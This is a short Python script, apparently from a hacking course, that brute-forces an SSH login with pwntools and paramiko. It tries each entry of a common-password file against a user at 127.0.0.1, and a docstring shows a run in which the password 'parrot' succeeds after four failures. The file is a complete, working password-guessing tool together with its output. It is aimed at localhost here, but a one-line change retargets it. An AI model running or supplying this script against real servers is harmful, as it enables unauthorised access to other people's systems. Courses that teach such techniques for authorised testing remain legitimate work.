
from pwn import *
import paramiko

host = '127.0.0.1'
username = 'user'
attempts = 0

password_list = open('common_passwords.txt').read().split("\n")
# print(password_list)

for password in password_list:
    try:
        print(f'Trying {attempts}th attmept with this password : {password}')
        response = ssh(host = host, user = username, password = password , timeout = 1)
        if response.connected():
            print(f'Valid password found : {password}')
            response.close()
            break
        response.close()
    except paramiko.ssh_exception.AuthenticationException as e:
        print("Invalid password")
    attempts += 1


"""
OUTPUT :

(venv) ┌─[user@parrot]─[~/Documents/TCM/py101_for_hackers]
└──╼ $python3 ssh_brute_force.py 
Trying 0th attmept with this password : root
[-] Connecting to 127.0.0.1 on port 22: Failed
Invalid password
Trying 1th attmept with this password : toor
[-] Connecting to 127.0.0.1 on port 22: Failed
Invalid password
Trying 2th attmept with this password : raspberry
[-] Connecting to 127.0.0.1 on port 22: Failed
Invalid password
Trying 3th attmept with this password : dietpi
[-] Connecting to 127.0.0.1 on port 22: Failed
Invalid password
Trying 4th attmept with this password : parrot
[+] Connecting to 127.0.0.1 on port 22: Done
[*] user@127.0.0.1:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  6.10.11
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
Valid password found : parrot
[*] Closed connection to '127.0.0.1'
(venv) ┌─[user@parrot]─[~/Documents/TCM/py101_for_hackers]
└──╼ $

"""